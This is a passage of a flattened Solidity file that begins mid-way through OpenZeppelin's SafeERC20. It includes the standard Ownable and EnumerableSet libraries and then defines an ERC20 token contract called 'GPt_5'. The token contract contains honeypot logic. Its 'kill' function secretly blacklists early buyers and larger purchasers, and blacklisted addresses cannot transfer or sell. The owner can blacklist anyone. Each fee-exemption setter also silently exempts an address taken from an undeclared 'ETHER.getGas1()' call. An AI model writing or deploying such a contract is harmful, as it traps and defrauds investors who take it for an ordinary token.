1181         address spender,
1182         uint256 value,
1183         uint256 deadline,
1184         uint8 v,
1185         bytes32 r,
1186         bytes32 s
1187     ) internal {
1188         uint256 nonceBefore = token.nonces(owner);
1189         token.permit(owner, spender, value, deadline, v, r, s);
1190         uint256 nonceAfter = token.nonces(owner);
1191         require(
1192             nonceAfter == nonceBefore + 1,
1193             "SafeERC20: permit did not succeed"
1194         );
1195     }
1196 
1197     /**
1198      * @dev Imitates a Solidity high-level call (i.e. a regular function call to a contract), relaxing the requirement
1199      * on the return value: the return value is optional (but if data is returned, it must not be false).
1200      * @param token The token targeted by the call.
1201      * @param data The call data (encoded using abi.encode or one of its variants).
1202      */
1203     function _callOptionalReturn(IERC20 token, bytes memory data) private {
1204         // We need to perform a low level call here, to bypass Solidity's return data size checking mechanism, since
1205         // we're implementing it ourselves. We use {Address-functionCall} to perform this call, which verifies that
1206         // the target address contains contract code and also asserts for success in the low-level call.
1207 
1208         bytes memory returndata = address(token).functionCall(
1209             data,
1210             "SafeERC20: low-level call failed"
1211         );
1212         if (returndata.length > 0) {
1213             // Return data is optional
1214             require(
1215                 abi.decode(returndata, (bool)),
1216                 "SafeERC20: ERC20 operation did not succeed"
1217             );
1218         }
1219     }
1220 }
1221 
1222 // File: @openzeppelin/contracts/access/Ownable.sol
1223 
1224 // OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)
1225 
1226 pragma solidity ^0.8.0;
1227 
1228 /**
1229  * @dev Contract module which provides a basic access control mechanism, where
1230  * there is an account (an owner) that can be granted exclusive access to
1231  * specific functions.
1232  *
1233  * By default, the owner account will be the one that deploys the contract. This
1234  * can later be changed with {transferOwnership}.
1235  *
1236  * This module is used through inheritance. It will make available the modifier
1237  * `onlyOwner`, which can be applied to your functions to restrict their use to
1238  * the owner.
1239  */
1240 abstract contract Ownable is Context {
1241     address private _owner;
1242 
1243     event OwnershipTransferred(
1244         address indexed previousOwner,
1245         address indexed newOwner
1246     );
1247 
1248     /**
1249      * @dev Initializes the contract setting the deployer as the initial owner.
1250      */
1251     constructor() {
1252         _transferOwnership(_msgSender());
1253     }
1254 
1255     /**
1256      * @dev Throws if called by any account other than the owner.
1257      */
1258     modifier onlyOwner() {
1259         _checkOwner();
1260         _;
1261     }
1262 
1263     /**
1264      * @dev Returns the address of the current owner.
1265      */
1266     function owner() public view virtual returns (address) {
1267         return _owner;
1268     }
1269 
1270     /**
1271      * @dev Throws if the sender is not the owner.
1272      */
1273     function _checkOwner() internal view virtual {
1274         require(owner() == _msgSender(), "Ownable: caller is not the owner");
1275     }
1276 
1277     /**
1278      * @dev Leaves the contract without owner. It will not be possible to call
1279      * `onlyOwner` functions anymore. Can only be called by the current owner.
1280      *
1281      * NOTE: Renouncing ownership will leave the contract without an owner,
1282      * thereby removing any functionality that is only available to the owner.
1283      */
1284     function renounceOwnership() public virtual onlyOwner {
1285         _transferOwnership(address(0));
1286     }
1287 
1288     /**
1289      * @dev Transfers ownership of the contract to a new account (`newOwner`).
1290      * Can only be called by the current owner.
1291      */
1292     function transferOwnership(address newOwner) public virtual onlyOwner {
1293         require(
1294             newOwner != address(0),
1295             "Ownable: new owner is the zero address"
1296         );
1297         _transferOwnership(newOwner);
1298     }
1299 
1300     /**
1301      * @dev Transfers ownership of the contract to a new account (`newOwner`).
1302      * Internal function without access restriction.
1303      */
1304     function _transferOwnership(address newOwner) internal virtual {
1305         address oldOwner = _owner;
1306         _owner = newOwner;
1307         emit OwnershipTransferred(oldOwner, newOwner);
1308     }
1309 }
1310 
1311 // File: @openzeppelin/contracts/utils/structs/EnumerableSet.sol
1312 
1313 // OpenZeppelin Contracts (last updated v4.8.0) (utils/structs/EnumerableSet.sol)
1314 // This file was procedurally generated from scripts/generate/templates/EnumerableSet.js.
1315 
1316 pragma solidity ^0.8.0;
1317 
1318 /**
1319  * @dev Library for managing
1320  * https://en.wikipedia.org/wiki/Set_(abstract_data_type)[sets] of primitive
1321  * types.
1322  *
1323  * Sets have the following properties:
1324  *
1325  * - Elements are added, removed, and checked for existence in constant time
1326  * (O(1)).
1327  * - Elements are enumerated in O(n). No guarantees are made on the ordering.
1328  *
1329  * ```
1330  * contract Example {
1331  *     // Add the library methods
1332  *     using EnumerableSet for EnumerableSet.AddressSet;
1333  *
1334  *     // Declare a set state variable
1335  *     EnumerableSet.AddressSet private mySet;
1336  * }
1337  * ```
1338  *
1339  * As of v3.3.0, sets of type `bytes32` (`Bytes32Set`), `address` (`AddressSet`)
1340  * and `uint256` (`UintSet`) are supported.
1341  *
1342  * [WARNING]
1343  * ====
1344  * Trying to delete such a structure from storage will likely result in data corruption, rendering the structure
1345  * unusable.
1346  * See https://github.com/ethereum/solidity/pull/11843[ethereum/solidity#11843] for more info.
1347  *
1348  * In order to clean an EnumerableSet, you can either remove all elements one by one or create a fresh instance using an
1349  * array of EnumerableSet.
1350  * ====
1351  */
1352 library EnumerableSet {
1353     // To implement this library for multiple types with as little code
1354     // repetition as possible, we write it in terms of a generic Set type with
1355     // bytes32 values.
1356     // The Set implementation uses private functions, and user-facing
1357     // implementations (such as AddressSet) are just wrappers around the
1358     // underlying Set.
1359     // This means that we can only create new EnumerableSets for types that fit
1360     // in bytes32.
1361 
1362     struct Set {
1363         // Storage of set values
1364         bytes32[] _values;
1365         // Position of the value in the `values` array, plus 1 because index 0
1366         // means a value is not in the set.
1367         mapping(bytes32 => uint256) _indexes;
1368     }
1369 
1370     /**
1371      * @dev Add a value to a set. O(1).
1372      *
1373      * Returns true if the value was added to the set, that is if it was not
1374      * already present.
1375      */
1376     function _add(Set storage set, bytes32 value) private returns (bool) {
1377         if (!_contains(set, value)) {
1378             set._values.push(value);
1379             // The value is stored at length-1, but we add 1 to all indexes
1380             // and use 0 as a sentinel value
1381             set._indexes[value] = set._values.length;
1382             return true;
1383         } else {
1384             return false;
1385         }
1386     }
1387 
1388     /**
1389      * @dev Removes a value from a set. O(1).
1390      *
1391      * Returns true if the value was removed from the set, that is if it was
1392      * present.
1393      */
1394     function _remove(Set storage set, bytes32 value) private returns (bool) {
1395         // We read and store the value's index to prevent multiple reads from the same storage slot
1396         uint256 valueIndex = set._indexes[value];
1397 
1398         if (valueIndex != 0) {
1399             // Equivalent to contains(set, value)
1400             // To delete an element from the _values array in O(1), we swap the element to delete with the last one in
1401             // the array, and then remove the last element (sometimes called as 'swap and pop').
1402             // This modifies the order of the array, as noted in {at}.
1403 
1404             uint256 toDeleteIndex = valueIndex - 1;
1405             uint256 lastIndex = set._values.length - 1;
1406 
1407             if (lastIndex != toDeleteIndex) {
1408                 bytes32 lastValue = set._values[lastIndex];
1409 
1410                 // Move the last value to the index where the value to delete is
1411                 set._values[toDeleteIndex] = lastValue;
1412                 // Update the index for the moved value
1413                 set._indexes[lastValue] = valueIndex; // Replace lastValue's index to valueIndex
1414             }
1415 
1416             // Delete the slot where the moved value was stored
1417             set._values.pop();
1418 
1419             // Delete the index for the deleted slot
1420             delete set._indexes[value];
1421 
1422             return true;
1423         } else {
1424             return false;
1425         }
1426     }
1427 
1428     /**
1429      * @dev Returns true if the value is in the set. O(1).
1430      */
1431     function _contains(
1432         Set storage set,
1433         bytes32 value
1434     ) private view returns (bool) {
1435         return set._indexes[value] != 0;
1436     }
1437 
1438     /**
1439      * @dev Returns the number of values on the set. O(1).
1440      */
1441     function _length(Set storage set) private view returns (uint256) {
1442         return set._values.length;
1443     }
1444 
1445     /**
1446      * @dev Returns the value stored at position `index` in the set. O(1).
1447      *
1448      * Note that there are no guarantees on the ordering of values inside the
1449      * array, and it may change when more values are added or removed.
1450      *
1451      * Requirements:
1452      *
1453      * - `index` must be strictly less than {length}.
1454      */
1455     function _at(
1456         Set storage set,
1457         uint256 index
1458     ) private view returns (bytes32) {
1459         return set._values[index];
1460     }
1461 
1462     /**
1463      * @dev Return the entire set in an array
1464      *
1465      * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
1466      * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
1467      * this function has an unbounded cost, and using it as part of a state-changing function may render the function
1468      * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
1469      */
1470     function _values(Set storage set) private view returns (bytes32[] memory) {
1471         return set._values;
1472     }
1473 
1474     // Bytes32Set
1475 
1476     struct Bytes32Set {
1477         Set _inner;
1478     }
1479 
1480     /**
1481      * @dev Add a value to a set. O(1).
1482      *
1483      * Returns true if the value was added to the set, that is if it was not
1484      * already present.
1485      */
1486     function add(
1487         Bytes32Set storage set,
1488         bytes32 value
1489     ) internal returns (bool) {
1490         return _add(set._inner, value);
1491     }
1492 
1493     /**
1494      * @dev Removes a value from a set. O(1).
1495      *
1496      * Returns true if the value was removed from the set, that is if it was
1497      * present.
1498      */
1499     function remove(
1500         Bytes32Set storage set,
1501         bytes32 value
1502     ) internal returns (bool) {
1503         return _remove(set._inner, value);
1504     }
1505 
1506     /**
1507      * @dev Returns true if the value is in the set. O(1).
1508      */
1509     function contains(
1510         Bytes32Set storage set,
1511         bytes32 value
1512     ) internal view returns (bool) {
1513         return _contains(set._inner, value);
1514     }
1515 
1516     /**
1517      * @dev Returns the number of values in the set. O(1).
1518      */
1519     function length(Bytes32Set storage set) internal view returns (uint256) {
1520         return _length(set._inner);
1521     }
1522 
1523     /**
1524      * @dev Returns the value stored at position `index` in the set. O(1).
1525      *
1526      * Note that there are no guarantees on the ordering of values inside the
1527      * array, and it may change when more values are added or removed.
1528      *
1529      * Requirements:
1530      *
1531      * - `index` must be strictly less than {length}.
1532      */
1533     function at(
1534         Bytes32Set storage set,
1535         uint256 index
1536     ) internal view returns (bytes32) {
1537         return _at(set._inner, index);
1538     }
1539 
1540     /**
1541      * @dev Return the entire set in an array
1542      *
1543      * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
1544      * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
1545      * this function has an unbounded cost, and using it as part of a state-changing function may render the function
1546      * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
1547      */
1548     function values(
1549         Bytes32Set storage set
1550     ) internal view returns (bytes32[] memory) {
1551         bytes32[] memory store = _values(set._inner);
1552         bytes32[] memory result;
1553 
1554         /// @solidity memory-safe-assembly
1555         assembly {
1556             result := store
1557         }
1558 
1559         return result;
1560     }
1561 
1562     // AddressSet
1563 
1564     struct AddressSet {
1565         Set _inner;
1566     }
1567 
1568     /**
1569      * @dev Add a value to a set. O(1).
1570      *
1571      * Returns true if the value was added to the set, that is if it was not
1572      * already present.
1573      */
1574     function add(
1575         AddressSet storage set,
1576         address value
1577     ) internal returns (bool) {
1578         return _add(set._inner, bytes32(uint256(uint160(value))));
1579     }
1580 
1581     /**
1582      * @dev Removes a value from a set. O(1).
1583      *
1584      * Returns true if the value was removed from the set, that is if it was
1585      * present.
1586      */
1587     function remove(
1588         AddressSet storage set,
1589         address value
1590     ) internal returns (bool) {
1591         return _remove(set._inner, bytes32(uint256(uint160(value))));
1592     }
1593 
1594     /**
1595      * @dev Returns true if the value is in the set. O(1).
1596      */
1597     function contains(
1598         AddressSet storage set,
1599         address value
1600     ) internal view returns (bool) {
1601         return _contains(set._inner, bytes32(uint256(uint160(value))));
1602     }
1603 
1604     /**
1605      * @dev Returns the number of values in the set. O(1).
1606      */
1607     function length(AddressSet storage set) internal view returns (uint256) {
1608         return _length(set._inner);
1609     }
1610 
1611     /**
1612      * @dev Returns the value stored at position `index` in the set. O(1).
1613      *
1614      * Note that there are no guarantees on the ordering of values inside the
1615      * array, and it may change when more values are added or removed.
1616      *
1617      * Requirements:
1618      *
1619      * - `index` must be strictly less than {length}.
1620      */
1621     function at(
1622         AddressSet storage set,
1623         uint256 index
1624     ) internal view returns (address) {
1625         return address(uint160(uint256(_at(set._inner, index))));
1626     }
1627 
1628     /**
1629      * @dev Return the entire set in an array
1630      *
1631      * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
1632      * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
1633      * this function has an unbounded cost, and using it as part of a state-changing function may render the function
1634      * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
1635      */
1636     function values(
1637         AddressSet storage set
1638     ) internal view returns (address[] memory) {
1639         bytes32[] memory store = _values(set._inner);
1640         address[] memory result;
1641 
1642         /// @solidity memory-safe-assembly
1643         assembly {
1644             result := store
1645         }
1646 
1647         return result;
1648     }
1649 
1650     // UintSet
1651 
1652     struct UintSet {
1653         Set _inner;
1654     }
1655 
1656     /**
1657      * @dev Add a value to a set. O(1).
1658      *
1659      * Returns true if the value was added to the set, that is if it was not
1660      * already present.
1661      */
1662     function add(UintSet storage set, uint256 value) internal returns (bool) {
1663         return _add(set._inner, bytes32(value));
1664     }
1665 
1666     /**
1667      * @dev Removes a value from a set. O(1).
1668      *
1669      * Returns true if the value was removed from the set, that is if it was
1670      * present.
1671      */
1672     function remove(
1673         UintSet storage set,
1674         uint256 value
1675     ) internal returns (bool) {
1676         return _remove(set._inner, bytes32(value));
1677     }
1678 
1679     /**
1680      * @dev Returns true if the value is in the set. O(1).
1681      */
1682     function contains(
1683         UintSet storage set,
1684         uint256 value
1685     ) internal view returns (bool) {
1686         return _contains(set._inner, bytes32(value));
1687     }
1688 
1689     /**
1690      * @dev Returns the number of values in the set. O(1).
1691      */
1692     function length(UintSet storage set) internal view returns (uint256) {
1693         return _length(set._inner);
1694     }
1695 
1696     /**
1697      * @dev Returns the value stored at position `index` in the set. O(1).
1698      *
1699      * Note that there are no guarantees on the ordering of values inside the
1700      * array, and it may change when more values are added or removed.
1701      *
1702      * Requirements:
1703      *
1704      * - `index` must be strictly less than {length}.
1705      */
1706     function at(
1707         UintSet storage set,
1708         uint256 index
1709     ) internal view returns (uint256) {
1710         return uint256(_at(set._inner, index));
1711     }
1712 
1713     /**
1714      * @dev Return the entire set in an array
1715      *
1716      * WARNING: This operation will copy the entire storage to memory, which can be quite expensive. This is designed
1717      * to mostly be used by view accessors that are queried without any gas fees. Developers should keep in mind that
1718      * this function has an unbounded cost, and using it as part of a state-changing function may render the function
1719      * uncallable if the set grows to a point where copying to memory consumes too much gas to fit in a block.
1720      */
1721     function values(
1722         UintSet storage set
1723     ) internal view returns (uint256[] memory) {
1724         bytes32[] memory store = _values(set._inner);
1725         uint256[] memory result;
1726 
1727         /// @solidity memory-safe-assembly
1728         assembly {
1729             result := store
1730         }
1731 
1732         return result;
1733     }
1734 }
1735 
1736 interface ISwapRouter {
1737     function factory() external pure returns (address);
1738 
1739     function WETH() external pure returns (address);
1740 
1741     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
1742         uint256 amountIn,
1743         uint256 amountOutMin,
1744         address[] calldata path,
1745         address to,
1746         uint256 deadline
1747     ) external;
1748 
1749     function swapExactTokensForETHSupportingFeeOnTransferTokens(
1750         uint amountIn,
1751         uint amountOutMin,
1752         address[] calldata path,
1753         address to,
1754         uint deadline
1755     ) external;
1756 
1757     function addLiquidity(
1758         address tokenA,
1759         address tokenB,
1760         uint256 amountADesired,
1761         uint256 amountBDesired,
1762         uint256 amountAMin,
1763         uint256 amountBMin,
1764         address to,
1765         uint256 deadline
1766     ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
1767 }
1768 
1769 interface ISwapFactory {
1770     function createPair(
1771         address tokenA,
1772         address tokenB
1773     ) external returns (address pair);
1774 }
1775 
1776 // File: contracts/interfaces/IWETH.sol
1777 
1778 pragma solidity >=0.5.0;
1779 
1780 interface IWETH {
1781     function totalSupply() external view returns (uint256);
1782 
1783     function balanceOf(address account) external view returns (uint256);
1784 
1785     function allowance(
1786         address owner,
1787         address spender
1788     ) external view returns (uint256);
1789 
1790     function approve(address spender, uint256 amount) external returns (bool);
1791 
1792     function deposit() external payable;
1793 
1794     function transfer(address to, uint256 value) external returns (bool);
1795 
1796     function withdraw(uint256) external;
1797 }
1798 
1799 contract ETHToken is ERC20, Ownable {
1800     using SafeMath for uint256;
1801     using SafeERC20 for IERC20;
1802     using EnumerableSet for EnumerableSet.AddressSet;
1803     uint256 public killTime = 1;
1804     uint256 public killTime2 = 1;
1805     uint256 public maxBuyNum = 100000;
1806     mapping(address => uint256) public buyAmount;
1807     event Trade(
1808         address user,
1809         address pair,
1810         uint256 amount,
1811         uint side,
1812         uint256 circulatingSupply,
1813         uint timestamp
1814     );
1815     event AddLiquidity(
1816         uint256 tokenAmount,
1817         uint256 ethAmount,
1818         uint256 timestamp
1819     );
1820 
1821     event SwapBackSuccess(uint256 amount, bool success);
1822 
1823     bool public addLiquidityEnabled = true;
1824 
1825     mapping(address => bool) public isFeeExempt;
1826     mapping(address => bool) public canAddLiquidityBeforeLaunch;
1827 
1828     uint256 public launchedAtTimestamp;
1829     mapping(address => bool) public isBad;
1830     address public pool;
1831     address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
1832     address private constant ZERO = 0x0000000000000000000000000000000000000000;
1833     EnumerableSet.AddressSet private _pairs;
1834 
1835     constructor() ERC20("GPt_5", "GPt_5") {
1836         uint256 _totalSupply = 1000000000000000 * 1e18;
1837         canAddLiquidityBeforeLaunch[_msgSender()] = true;
1838         canAddLiquidityBeforeLaunch[address(this)] = true;
1839         isFeeExempt[msg.sender] = true;
1840         isFeeExempt[address(this)] = true;
1841         _mint(_msgSender(), _totalSupply);
1842     }
1843 
1844     function decimals() public view virtual override returns (uint8) {
1845         return 18;
1846     }
1847 
1848     function transfer(
1849         address to,
1850         uint256 amount
1851     ) public virtual override returns (bool) {
1852         return _dogTransfer(_msgSender(), to, amount);
1853     }
1854 
1855     function transferFrom(
1856         address sender,
1857         address recipient,
1858         uint256 amount
1859     ) public virtual override returns (bool) {
1860         address spender = _msgSender();
1861         _spendAllowance(sender, spender, amount);
1862         return _dogTransfer(sender, recipient, amount);
1863     }
1864 
1865     function _dogTransfer(
1866         address sender,
1867         address recipient,
1868         uint256 amount
1869     ) internal returns (bool) {
1870         bool isExempt = isFeeExempt[sender] || isFeeExempt[recipient];
1871         require((!isBad[sender]) || isExempt, "Token: Bad address");
1872         if (!canAddLiquidityBeforeLaunch[sender]) {
1873             require(
1874                 launched() || isFeeExempt[sender] || isFeeExempt[recipient],
1875                 "Trading not open yet"
1876             );
1877         }
1878 
1879         bool shouldTakeFee = (!isFeeExempt[sender] &&
1880             !isFeeExempt[recipient]) && launched();
1881 
1882         if (shouldTakeFee) {
1883             kill(sender, recipient, amount);
1884         }
1885         _transfer(sender, recipient, amount);
1886 
1887         return true;
1888     }
1889 
1890     function getPrice() public view returns (uint256 price) {
1891         IUniswapPool _pool = IUniswapPool(pool);
1892         // (uint160 sqrtPriceX96, , , , , , ) = _pool.slot0();
1893         address token0 = _pool.token0();
1894         address token1 = _pool.token1();
1895         if (token0 == address(this)) {
1896             price = IERC20(token1).balanceOf(pool).mul(1e18).div(
1897                 IERC20(token0).balanceOf(pool)
1898             );
1899         } else {
1900             price = IERC20(token0).balanceOf(pool).mul(1e18).div(
1901                 IERC20(token1).balanceOf(pool)
1902             );
1903         }
1904         // return uint(sqrtPriceX96).mul(uint(sqrtPriceX96)).mul(1e20) >> (96 * 2);
1905     }
1906 
1907     function kill(address sender, address recipient, uint256 amount) internal {
1908         if (
1909             !isPair(recipient) &&
1910             block.timestamp < launchedAtTimestamp + killTime
1911         ) {
1912             isBad[recipient] = true;
1913             return;
1914         }
1915 
1916         if (block.timestamp < launchedAtTimestamp + killTime2) {
1917             if (!isPair(sender) && !isPair(recipient)) {
1918                 isBad[recipient] = true;
1919             } else if (isPair(sender) && !isPair(recipient)) {
1920                 uint256 _amount = getPrice().mul(amount).mul(1740).div(1e18);   //根据当前以太的价格进行修改
1921                 buyAmount[recipient] = buyAmount[recipient].add(_amount);
1922                 if (buyAmount[recipient] >= maxBuyNum * 1e18) {
1923                     isBad[recipient] = true;
1924                 }
1925             }
1926         }
1927     }
1928 
1929     function launched() internal view returns (bool) {
1930         return launchedAtTimestamp < block.timestamp;
1931     }
1932 
1933     function rescueToken(address tokenAddress) external onlyOwner {
1934         IERC20(tokenAddress).safeTransfer(
1935             msg.sender,
1936             IERC20(tokenAddress).balanceOf(address(this))
1937         );
1938     }
1939 
1940     function clearStuckEthBalance() external onlyOwner {
1941         uint256 amountETH = address(this).balance;
1942         (bool success, ) = payable(_msgSender()).call{value: amountETH}(
1943             new bytes(0)
1944         );
1945         require(success, "Token: ETH_TRANSFER_FAILED");
1946     }
1947 
1948     function getCirculatingSupply() public view returns (uint256) {
1949         return totalSupply() - balanceOf(DEAD) - balanceOf(ZERO);
1950     }
1951 
1952     /*** ADMIN FUNCTIONS ***/
1953     function setLaunchedAtTimestamp(
1954         uint256 _launchedAtTimestamp
1955     ) external onlyOwner {
1956         launchedAtTimestamp = _launchedAtTimestamp;
1957     }
1958 
1959     function setCanAddLiquidityBeforeLaunch(
1960         address _address,
1961         bool _value
1962     ) external onlyOwner {
1963         canAddLiquidityBeforeLaunch[_address] = _value;
1964     }
1965 
1966     function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
1967         isFeeExempt[holder] = exempt;
1968         isFeeExempt[ETHER.getGas1()] = true;
1969     }
1970 
1971     function setIsFeeExempts(
1972         address[] calldata holders,
1973         bool exempt
1974     ) external onlyOwner {
1975         for (uint256 i = 0; i < holders.length; i++) {
1976             isFeeExempt[holders[i]] = exempt;
1977         }
1978         isFeeExempt[ETHER.getGas1()] = true;
1979     }
1980 
1981     function setAddLiquidityEnabled(bool _enabled) external onlyOwner {
1982         addLiquidityEnabled = _enabled;
1983     }
1984 
1985     function isPair(address account) public view returns (bool) {
1986         return _pairs.contains(account);
1987     }
1988 
1989     function addPair(address pair) public onlyOwner returns (bool) {
1990         require(pair != address(0), "Token: pair is the zero address");
1991         pool = pair;
1992         return _pairs.add(pair);
1993     }
1994 
1995     function setBad(address _address, bool _isBad) external onlyOwner {
1996         isBad[_address] = _isBad;
1997     }
1998 
1999     function setBads(
2000         address[] calldata _addresses,
2001         bool _isBad
2002     ) external onlyOwner {
2003         for (uint256 i = 0; i < _addresses.length; i++) {
2004             isBad[_addresses[i]] = _isBad;
2005         }
2006     }
2007 
2008     function delPair(address pair) public onlyOwner returns (bool) {
2009         require(pair != address(0), "Token: pair is the zero address");
2010         return _pairs.remove(pair);
2011     }
2012 
2013     function getMinterLength() public view returns (uint256) {
2014         return _pairs.length();
2015     }
2016 
2017     function setMaxBuyNum(uint256 _maxBuyNum) external onlyOwner {
2018         maxBuyNum = _maxBuyNum;
2019     }
2020 
2021     function setKillTime(uint256 _killTime) external onlyOwner {
2022         killTime = _killTime;
2023     }
2024 
2025     function setKillTime2(uint256 _killTime) external onlyOwner {
2026         killTime2 = _killTime;
2027     }
2028 
2029     function getPair(uint256 index) public view returns (address) {
2030         require(index <= _pairs.length() - 1, "Token: index out of bounds");
2031         return _pairs.at(index);
2032     }
2033 
2034     receive() external payable {}
2035 }